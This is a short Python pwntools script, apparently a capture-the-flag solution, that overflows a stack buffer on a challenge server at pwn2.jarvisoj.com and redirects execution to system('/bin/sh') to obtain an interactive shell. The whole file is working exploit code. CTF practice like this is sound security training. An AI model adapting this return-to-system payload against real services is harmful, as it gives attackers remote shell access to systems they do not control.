#coding:utf-8

from pwn import *

pwn = remote('pwn2.jarvisoj.com',9878)

binsh_addr = 0x0804A024
system_plt = 0x8048320

pwn.recv()
            # buf_input + ebp + return_address + faked_return + "/bin/sh"
payload = 'a'*0x88 + 'a'*4 + p32(system_plt) + p32(0xaaaa) + p32(binsh_addr)

pwn.sendline(payload)
pwn.interactive()
